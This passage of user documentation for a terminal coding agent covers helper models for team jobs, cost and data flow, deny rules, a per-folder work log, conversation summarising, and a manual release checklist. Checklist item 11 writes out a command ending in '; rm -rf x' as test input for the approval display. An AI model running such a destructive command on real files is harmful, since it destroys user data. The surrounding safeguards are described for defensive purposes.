- The folder's list **replaces** yours entirely; the lists are not joined. `"teamModels": []` in a folder's file (or a list whose entries are all invalid) turns extra models off for that folder. A value that is not a list is ignored with a warning (`'teamModels' must be a list of model names; ignored`) and your own list stays in force. As for `model`, a folder's file is read only after you trust the folder.
- The list names models helpers may use **in addition to** the chat's model. The chat's model is never listed twice: if you name it, the name is dropped. After `/model <name>` the next job works out the list again against the new chat model.

**Commands.**

| Command | Does |
|---|---|
| `/team-models` | Show the list with its notes (`gpt-6.1-sol (hard coding)`), where it came from (a settings file, or `this session`), which models a job may use now, and a `Not used now: ...` line for each name that cannot be used. When a settings file holds an empty list it says `Helper models: none - turned off by <path>.` |
| `/team-models <name>[="what it is for"] ...` | Set the list (and any notes) for this session only, for example `/team-models gpt-6.1-sol="hard coding" gpt-6-luna="fast reading" gpt-5.5`. Bad names or notes are reported and the rest kept; if no name is good, the list is left as it was. An unclosed quote shows the usage. |
| `/team-models <name> ... --folder` | The same, and also save the list in this folder's `.agentx/settings.json`, keeping its other keys. It follows the rules of `/model --folder`: nothing is written for your home folder or a drive root (`No folder settings file is kept for your home folder or a drive root.`), through a link, or over a file that is not valid JSON; the session still changes. |
| `/team-models describe [--folder]` | Ask the chat model again what each model (the chat's own included) is good for, replacing only `auto:` notes. The list and where it came from stay as they are; with `--folder` the list and its notes are saved in this folder's file. |
| `/team-models clear` | Empty the list for this session: helpers use the chat's model only. |
| `/team-models clear --folder` | The same, and save an empty list (`[]`) in the folder's file, so extra models stay off for this folder. |

`/settings` shows the list as `Helper models: ...` (or `none (helpers use the chat model)`).

**What you see.**

- The approval panel gets one more line, for example `Helper models: claude-sonnet-5-5 (chat), claude-opus-5-5, gpt-5.5`: the chat's model first, then the listed models whose key is set. It appears only when a list is set. It is worked out from the keys without building the models, so a model that then cannot be set up still appears there.
- When the job starts, a name that cannot be used is reported once, above the plan, and the job runs with the rest. With a missing key: `Not used: gpt-5.5 (no OPENAI_API_KEY)` (`ANTHROPIC_API_KEY` for a Claude model). With a model that cannot be set up, the line carries the reason when the app wrote one to be shown, cut to about 160 characters on one line, for example `Not used: claude-opus-5-5 (No module named 'anthropic' - install agentx-dev[anthropic])` for a GPT chat that lists a Claude model without the optional `anthropic` package. For any other failure only the kind of error is shown (`Not used: gpt-5.5 (could not be set up: ValueError)`), because that error's own message could contain the key. The chat's model is always there, so a job never has zero helpers.
- Each model, the chat's included, gets the three roles under the names `explorer@<model>`, `coder@<model>` and `runner@<model>`, such as `coder@claude-opus-5-5` and `runner@claude-sonnet-5-5`: with 4 extra models that is up to 15 helpers. The name appears in the plan, in the `-> coder@claude-opus-5-5: ...` line, in the `[coder@claude-opus-5-5]` tool bullets, in the `Helper:` line of an approval box, in the `done (...)` and `failed (...)` lines, and in the result the agent gets back, so the conversation and the saved session show which model did each step. (The work log keeps its one `Team job:` line.)
- The supervisor reads each helper's description: the role, `Runs on <model>.`, your note if there is one (`Good for: ...`), and `There is one copy of each role per model: pick the copy whose model best fits this step.` Every model gets the same words, so none is favoured, and it picks a helper for each step. It may still choose the chat's model for every step when it judges that best; a note on each model gives it the most to go on.

**Cost and data.**

- Each step costs what its model costs. A job that uses a strong model for a hard step costs more than the same job on the chat's model. A helper may take up to 100 model steps per job step (it was 25, then 50), and one message may run up to 5 jobs, so a single message on a big task can cost much more than a chat answer: at most 5 jobs of up to 6 steps, each step up to 100 model calls by its helper (about 3,000 helper calls in the worst case), plus the planning. Batches stop early when a job finished no step (`no step of the last team job finished`). Remove expensive models from the list, or stay out of `auto` mode, if that matters.
- The planner always runs on the chat's model; only helpers move.
- Helpers on another provider receive the same system prompt as the chat: your `AGENTX.md` files, the recent-work block from the log (in a conversation that started fresh) and the role text. They also receive the step's task, the results of earlier steps, and everything the helper reads or runs in that step, including files in your `addDirs` folders. So all of that goes to that provider's API. A folder's `.agentx/settings.json` can set `teamModels`, as it can set `model`, so a repository you cloned could send this to a provider you did not choose. Two things tell you: a notice at startup when the list comes from the project's file (`This project's settings let team helpers also use: ... (from <path>). /team-models clear turns that off for this session.`; it does not ask, and a list from your own settings file or set in the session gets none), and the `Helper models:` line in the approval panel before you approve a job (in `auto` mode, or with your own allow rule, nothing asks first, so the startup notice is the one to read).
- Nothing about what a helper may do changes: every helper, on any model, goes through the same gate, modes, deny rules, protected files and prompts, and a deny rule `start_team_job:*` still turns team jobs off.

### Turning it off

Add a deny rule to `~/.agentx/settings.json` (or the project's file):

```json
{
  "permissions": {
    "deny": ["start_team_job:*"]
  }
}
```

The agent is then refused every time it tries, in every mode, `auto` included. The rule is matched against the task text, so `start_team_job:*` matches every job.

### Limits

- Helpers run one at a time; nothing runs in parallel.
- The three roles are fixed. Extra models (see [Helper models](#helper-models)) add the same roles on other models; they cannot add a new kind of helper, and the supervisor does not switch a failed step to another model.
- There is no memory between jobs. Each step is a fresh helper (the supervisor passes earlier results along), built for the job from the model in use at that moment (and from the helper models list at that moment), so `/model` and `/team-models` apply from the next job.
- A failed step is not retried, because a retry would repeat what the helper already did. A step that depends on the failed one is skipped, and the result lists each step as done, partial (ran out of steps), failed or skipped.
- A step is at most 100 model steps for the helper, and a job at most 6 plan steps. A helper that runs out of steps does not fail its step: what it did is handed on marked partial (`partial (ran out of steps)` in the result, `(This helper ran out of steps before finishing, so this is partial work ...)` in its report), and the steps after it, such as the runner that tests the coder's edits, still run. The live line reads `partial (coder): (This helper ran out of steps ...`.
- The task the agent passes is at most 4,000 characters and its reason at 500; longer text is refused with a message, not cut.
- A team job makes many model calls: expect it to cost much more than a normal turn, and more still when a step runs on a pricier model.
- At most 4 extra models; the planner always runs on the chat's model.

## Project memory

`agentx` keeps four things per folder so that a project does not start from nothing every time: a model of its own, a work log, a fresh conversation that starts from that log, and a summary in place of a very long history. None of it needs a setting, and none of it is kept for your home folder or a drive root (neither is a project).

### A model for each folder

The first time you say yes to the trust question for a folder, `agentx` writes `<folder>/.agentx/settings.json` with the model in use and nothing else:

```json
{
  "model": "claude-sonnet-4-6"
}
```

and prints `Created <path> with this folder's model. /model <name> --folder changes it.` An existing file is never touched, and nothing is written before you have said yes. Edit the file like any project settings file (the other keys and the [untrusted-project rules](#project-settings-are-untrusted) are unchanged).

- `/model <name> --folder` switches the model now **and** saves it for this folder. It keeps the other keys in an existing file and prints `Updated <path> with model <name>.` (`Created ...` when there was no file). If the file is not valid JSON, or not a JSON object, it is left exactly as it was and you are told so; the model is still switched for the session.
- `/model <name>` on its own is for this session only. Its notice says so, and points at `--folder` and at your own settings file: `Model: <name> (this session only). Add --folder to keep it for this folder. "model" in <your file> is the default for folders without their own .agentx/settings.json; a folder's file (written when you first trust the folder) wins.` `/model` with no name shows the same hint.
- In your home folder or a drive root, `/model <name> --folder` switches the model for the session and prints `No folder settings file is kept for your home folder or a drive root.` instead of writing anything.
- If the folder cannot be written, you get a one-line notice and no traceback.

The model is chosen in this order: `--model`, the folder's file, your file (`~/.agentx/settings.json`), then the default that your API key decides.

### The work log

After each **finished** turn the app (not the model, and with no extra model call) adds an entry to `<folder>/.agentx/log.md`. It is plain markdown, so you can read it, edit it or delete it:

```text
## 2026-10-12 14:03 - Add a docstring to each module
Changed: src/a.py, src/b.py
Ran: pytest -q
Answer: I added docstrings to 6 modules and the tests pass.
```

- The title is your message (cut at 80 characters); `/init` and `/team <task>` are logged as `/init` and `/team <task>`. A line is left out when it has nothing in it.
- **Changed** lists the paths of `write_file`, `edit_file`, `delete_path` and `move_file` calls (a move reads `source -> destination`), at most 10 and then "and N more". A call that was refused, declined or failed is not listed. This is a text check on the tool's result, so a rare unusual result could be misjudged.
- **Ran** lists `run_shell` commands (the first 100 characters of each) and `run_python` calls (`python: <first line>`), under the same rule.
- **Answer** is the start of the final answer (300 characters). A whole entry is at most 1,200.
- A team job is one line, `Team job: <task> (<outcome>)`, where the outcome is the job's result word such as `done` or `partial` (`ended` when none is given). A refused or declined team call writes no `Team job` line; a job that stops with an error is logged with the outcome `ended`. The files the helpers changed and the commands they ran are **not** listed: the chat does not see their tool results, only the job's summary.
- A turn you interrupted with Ctrl+C, or one that ended in an error, writes no entry (its history is not kept either).
- Keys and secrets are hidden before anything is written, with the same hiding as error messages (key-shaped tokens and the actual values of keys in your environment). That covers what you type and the commands that ran. It is a pattern check, not a promise: do not put secrets in requests.
- The file is readable by you only, where the platform has file modes, and so is `log-older.md`. The folder's `.agentx` and the log files must be real files inside the folder: if `.agentx`, `log.md` or `log-older.md` is a link (a symlink, or a junction on Windows), or leads outside the folder, the log is neither written nor loaded. A rotation writes through a new temporary file with a unique name, so a file planted under a fixed name is never opened. The same check guards `.agentx/settings.json`: `agentx` never creates or changes it through a link or outside the folder, and `/model <name> --folder` then says the file was left unchanged.
- It lives in the folder, so a commit would include it. Add `.agentx/log.md` and `.agentx/log-older.md` to `.gitignore` if it should stay private; `agentx` never edits `.gitignore`.
- Above 200 KB the oldest half of the entries moves to `log-older.md` (which is not loaded) and the log keeps the rest.
- The model cannot write here: `.agentx/*` is protected (see [Default protections](#default-protections)), and the app writes with Python, not through a tool.
- If it cannot be written (a read-only folder, a full disk, a refused location) you get one notice per session, `Could not write the work log in .agentx/log.md; carrying on without it.`, and the chat carries on.

### Starting from the log

A fresh conversation (a start without `--continue` or `--resume`, a `--continue` or a bare `--resume` that finds no saved conversation and so starts a new one, and `/clear`; `--resume <id>` with no match is an error and starts nothing) reads the newest entries of the log, up to 6,000 characters and starting on an entry heading, and adds them to the model's instructions under "Recent work in this folder". The block is marked as written by earlier sessions, possibly from a cloned repository, possibly out of date, and unable to override the base rules or the approval prompts; tags inside the text are defused and the block is always closed. So "what did we do here?" works after a restart.

When `--continue`, `--resume` or `/resume` load a saved conversation, it comes back as it was and the log is **not** added: project text such as the log, which may have been written by someone else, is never put into a conversation that already exists. A team's helpers get the same instructions as the chat, so in a conversation that started fresh they see the recent-work block too. A missing, binary or unreadable log is skipped without a message.

### Summarising a long conversation

Every turn sends the whole history again, so a long conversation costs more with each message and in the end overflows the model's limit. Before a turn, when the saved history is over about 150,000 characters (roughly 40,000 tokens), `agentx` replaces the older part with a summary:

- Your last 6 messages, and everything the agent did after the first of them, stay word for word. The cut always falls on one of your messages, so a tool call is never separated from its result. Nothing is summarised unless there is something older than that.
- One call to the model in use (no tools, a spinner reading "Summarising the conversation") writes the summary, in at most 500 words: what you wanted, what was decided, the files changed, the commands that mattered and what is open. It is shown the older messages as text, with each tool result cut to 500 characters and the whole input capped at 60,000. It works the same for models that call tools natively and for plain-text ones.
- The older messages become one summary message plus a short reply, and `Summarised N earlier messages to keep the conversation short.` is printed. The summary is also written to the log as an `Earlier conversation summarised` entry, and the saved session keeps the shorter history.
- It runs only when needed, at the start of a turn. A later summary starts from the earlier one, so it is carried forward rather than lost.
- If the call fails or answers with too little, nothing is removed: you see `The conversation is getting long, but it could not be summarised right now; it will be tried again later.` and it is tried again after 10 more messages (or in a new conversation). Messages are never dropped without a summary in their place.
- The summary is model output and has no authority. Its message says so: it was written by a model from the earlier messages and may quote file contents and tool output, which are data, not your instructions. A later summary does not summarise it again as ordinary text: it is put in full at the front of the next summary's input and carried into the new summary.

### Limits

- None of this is kept for your home folder or a drive root: no folder settings file, no log, nothing loaded.
- The 150,000-character threshold counts characters, which is only a rough stand-in for tokens; a conversation heavy in code or non-English text can reach the model's limit earlier. The thresholds are fixed in this version.
- Once your last 6 messages and what followed them are over the threshold on their own, every further turn makes one small summary call first (the earlier summary plus the one turn that has just dropped out of the last 6).
- The log is not searched by meaning: only the newest entries are loaded, and `log-older.md` never is.
- A team job is one log line (see above), and the log holds what the app saw, not everything that happened.
- There is no `/compact` command; summarising happens by itself.

## Keys

While `agentx` waits for you the prompt is coloured and the cursor blinks; while it is working, a spinner with the seconds elapsed shows instead (see the checklist below). A still cursor with no spinner means the terminal is the problem, not the program.

| Key | Does |
|---|---|
| Enter | Send (or confirm in a menu). |
| Up / Down in a menu | Move through the numbered choices (an approval, the folder question, `/resume`); a number picks one directly, Esc cancels. |
| Alt+Enter | New line in the message. |
| Tab | Complete a `/command`, or a file path for the word you are typing. |
| Up / Down | Earlier messages, kept between runs (when no menu is open). |
| Shift+Tab | Cycle the mode; the status bar updates. |
| Ctrl+D | Leave. |

The status bar shows the model, the mode, the folder, the short session id and the Shift+Tab hint. A tool call prints as one line (`● edit_file src/app.py`), its result is collapsed to the first three lines plus "... N more lines", the model's thoughts are dim, and the final answer is rendered as Markdown. When the output stream is not UTF-8 (a redirected cp1252 or ASCII stream, say) the line starts with `*` instead of the dot; a Windows console reports UTF-8 and prints the dot.

## Limits in this version

- **No token streaming.** Each step shows as it happens, but the answer appears when the turn ends. The framework streams tokens only in text-tool mode, not with native function calling, which newer models need.
- **No headless mode.** There is no `agentx -p "task"`; a non-terminal exits with code 1.
- **No MCP configuration, custom commands or hooks.**
- **No mode that never asks.** `auto` still asks before delete and move and for tools the gate does not know. The protected files (`.git`, `.agentx`, git and shell config) are refused in every mode.
- **Teams mode is limited:** helpers run one at a time and the roster is fixed, though each role can run on extra models you allow (see [Team jobs](#team-jobs)).
- You cannot type while the agent is working.
- **No size cap on `read_path`.** A very large file the model reads goes into the history whole, and every later turn sends it again, so a single huge read can exceed the model's context window before [summarising](#summarising-a-long-conversation) can help (it works on the history before a turn, not on one oversized result), and later turns then fail until you start over with `/clear`. Ask for the part of a file you need, or use `grep`.
- **Project memory is approximate.** The work log is a short text record, not a search index, and summarising is triggered by a character count (see [Project memory](#project-memory)).
- `run_shell` and `run_python` run with a scrubbed environment, and `run_python` uses `agentx`'s own interpreter (see [What it can do](#what-it-can-do)).

## Try it by hand

A checklist for the maintainer to run once on a real terminal before release. Tests cover the logic with an injected `read_line` and a string-backed console; they cannot cover the real keyboard and screen.

1. Type a message, quit with `/exit`, start `agentx` again, press Up: the message is back.
2. Alt+Enter makes a new line instead of sending.
3. Type `/mo` and press Tab: it completes. Type a partial file name and press Tab: it completes the path.
4. The status bar shows the model, the mode and the folder.
5. Shift+Tab cycles the mode and the bar updates.
6. Ask for a change to a file: the approval box shows an `Action:` line (and a `Subject:` line where it differs), a coloured diff, and `y` writes the file.
7. Answer `n` with a reason: the model adjusts instead of repeating the edit.
8. Answer `a` on an edit, make a second edit (it runs without asking), then type `/clear` and ask for another edit: it asks again.
9. Ask it to run `pytest`, answer `a`: the next `pytest` runs without asking. After `/clear` it asks again.
10. Put `{"mode": "accept-edits"}` in `.agentx/settings.json` in a test project and start `agentx` there: a warning says it was ignored, and the bar shows `default`.
11. Ask the model to run a command that is wider than the screen with a dangerous-looking tail (for example `echo ok`, a very long string, then `; rm -rf x`): the approval box shows the whole command, wrapped, so the tail is visible.
12. Press Ctrl+C at an approval prompt: only that call is declined, and the turn carries on.
13. Press Ctrl+C in the middle of a turn: "Turn interrupted" is printed and the next message works.
14. Ask the model to edit a file under `.git/` or `.agentx/`: it is refused with the deny-rule message, with no prompt.
15. `agentx --continue` after a restart remembers the conversation.
16. Run `echo hi | agentx` (or with stdin redirected): it prints the "interactive terminal" message and the exit code is 1.
17. Start with `PYTHONIOENCODING=cp1252 agentx` (on Windows: `$env:PYTHONIOENCODING = "cp1252"` first): a tool call's bullet shows as `*`. Without it, in cmd.exe, PowerShell or Windows Terminal, the bullet is the dot, since Python reports UTF-8 for the console.
18. Put `{"permissions": {"allow": ["write_file"]}}` in `.agentx/settings.json` in a test project and start `agentx` there: the rule is listed and `Honour these project rules? [y/N]` is asked. Press Enter: the rule is dropped for the session and a write still asks. Start again and answer `y`: writes run without asking.
19. Ask the model to move a file into an existing folder: the prompt says `Move a to b/a`. Ask it to move a folder named `.agentx` into the project root: it is refused with the deny-rule message.
20. Start `agentx --mode auto` in a scratch folder: a notice explains what auto does, a file write and a Python run go through without a prompt, and a delete still asks. Press Shift+Tab: the bar returns to `default`, and Shift+Tab again never lands on `auto`.
21. Ask the agent to run a script that takes 15 seconds (for example `import time; time.sleep(15)`): a spinner reads "Running run_python... Ns" while it works, disappears when the output is printed, and is not drawn over an approval prompt.
22. Start `agentx` in a folder you have never used it in: the "Accessing workspace" question appears with `1. Yes, I trust this folder` highlighted; Down then Enter exits with code 1 and reads nothing from the folder; Yes starts, and the next start in that folder does not ask. Try it in your home folder: the extra warning shows.
23. At an approval prompt press Down, Down, Enter (No), then type a reason; then repeat and press 1 (Yes). Press Esc at a prompt: it counts as no. `/resume` with no id shows an arrow-key list of conversations.
24. Watch the cursor at the `>` prompt: it blinks and the prompt is cyan. While the agent works there is a spinner instead. (A terminal that ignores cursor-shape requests keeps its own cursor, but the prompt colour still differs from the working spinner.)
25. Ask for something big ("survey this project, then add a docstring to each module and run the tests"): the hand-off prompt appears with the task, the helpers and the cost warning, and "don't ask again" is not offered. Approve it: the plan, the `-> explorer: ...` lines and the `[helper]` tool bullets show, and the spinner reads "Running <helper>".
26. During that job, a write asks with a `Helper: coder` line in the box and `● [coder] edit_file ...` printed just above it. Each step ends with a `done (...)` line.
27. Type `/team` with no task: the usage is printed. Type `/team <task>`: the same hand-off prompt appears (the model may decline; then nothing runs).
28. Add `"deny": ["start_team_job:*"]` under `permissions` in your settings and start again, then ask for a big job: the hand-off is refused with the deny-rule message and no prompt.
29. Press Ctrl+C during a job: "Turn interrupted" is printed, files already changed stay changed, and the next message works.
30. Start `agentx` in a folder you have never trusted and answer yes: `.agentx/settings.json` appears with the model in use and the "Created ... with this folder's model" notice is printed. In your home folder nothing is created. Run `/model gpt-4o-mini --folder`, quit and start again: the status bar shows `gpt-4o-mini`. `/model claude-sonnet-4-6` alone says "(this session only)" and mentions `--folder`.
31. Ask for a small change, approve it, then read `.agentx/log.md`: an entry with the time, your request, `Changed:`, and the start of the answer. Press Ctrl+C in the middle of another turn: no entry is added for it.
32. Type `/clear` and ask "what did we do here?": the answer comes from the log. Start with `agentx --continue` instead: the log is not loaded, the old conversation is.
33. Type a request that contains a key-shaped text such as `sk-test-1234567890abcdef` (or your real key in the environment, in a scratch folder): the log shows it hidden.
34. Make a very long conversation (or lower `THRESHOLD_CHARS` in `agentx_dev/cli/compact.py` temporarily in a scratch copy, for example to 3000) and send one more message: a spinner reads "Summarising the conversation", `Summarised N earlier messages to keep the conversation short.` is printed, the last answers still make sense, and the log has an `Earlier conversation summarised` entry.
35. With both keys set, type `/team-models claude-opus-5-5 gpt-5.5` (or two other models) and ask for a big job: the approval box has a `Helper models:` line naming the chat's model and both, and at least one step is dispatched as `-> coder@<model>: ...` with a matching `done (coder@<model>)` line.
36. Type `/team-models` with a model whose key is not set (unset `OPENAI_API_KEY` and list `gpt-5.5`): it shows `Not used now: gpt-5.5 (no OPENAI_API_KEY)`. Ask for a big job: `Not used: gpt-5.5 (no OPENAI_API_KEY)` is printed once above the plan and the job runs on the rest.
37. Type `/team-models clear` and ask for a big job: the approval box has no `Helper models:` line and the helpers are the plain `explorer`, `coder` and `runner`. `/team-models gpt-5.5 --folder` then writes `teamModels` into `.agentx/settings.json` (other keys kept), and `/settings` lists it.
38. In a folder whose `.agentx/settings.json` has `"teamModels": ["claude-opus-5-5"]` (and you have not set that list in your own file), start `agentx`: before the first prompt it prints `This project's settings let team helpers also use: claude-opus-5-5 (from <path>). /team-models clear turns that off for this session.` With the list in your own `~/.agentx/settings.json` instead, no such notice is printed. With `"teamModels": []` in the folder file, `/team-models` says `Helper models: none - turned off by <path>.`
39. Type `/team-models gpt-5.5="fast reading" claude-opus-5-5`: `/team-models` lists `gpt-5.5 (fast reading), claude-opus-5-5`; add `--folder` and `.agentx/settings.json` holds `{"model": "gpt-5.5", "use": "fast reading"}` and the plain string `"claude-opus-5-5"`. Ask for a big job: every dispatch line names a model (`-> runner@<chat model>: ...` or `-> coder@claude-opus-5-5: ...`), none is plain `runner`. A note with an apostrophe left unquoted (`gpt-5.5=user's pick`) says `A quote is not closed`.
40. Type `/team-models gpt-5.5 claude-opus-5-5` with no notes: a spinner reads "Asking the model about the helper models", then `/team-models` shows `auto:` notes for the models the chat model knows (and a `No note for ...` line for any it does not). `/team-models describe` asks again; a note you wrote yourself (`gpt-5.5="mine"`) stays as written.
